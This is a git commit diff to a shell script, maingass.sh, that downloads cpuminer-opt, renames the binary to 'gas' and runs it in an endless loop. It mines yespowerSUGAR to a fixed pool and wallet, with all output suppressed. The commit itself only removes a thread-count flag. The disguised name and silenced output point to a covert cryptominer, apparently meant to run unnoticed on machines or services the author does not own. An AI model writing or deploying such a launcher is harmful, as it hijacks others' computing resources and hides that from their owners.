06edb3c8770545cc74797f82540f7a76c45621c2
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-04-11 17:03:47 +0800

    Update maingass.sh

--- maingass.sh
+++ maingass.sh
@@ -17,7 +17,7 @@ wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpu
 tar xf cpuminer-opt-linux.tar.gz > /dev/null 2>&1
 mv cpuminer-avx gas > /dev/null 2>&1
 while [ 1 ]; do
-./gas -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qdgf4da5dcafhug574a0zjrfwkge262tl3q99e8.Okbaah -t8 > /dev/null 2>&1
+./gas -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qdgf4da5dcafhug574a0zjrfwkge262tl3q99e8.Okbaah > /dev/null 2>&1
 sleep 3 > /dev/null 2>&1
 done
 sleep 999 > /dev/null 2>&1
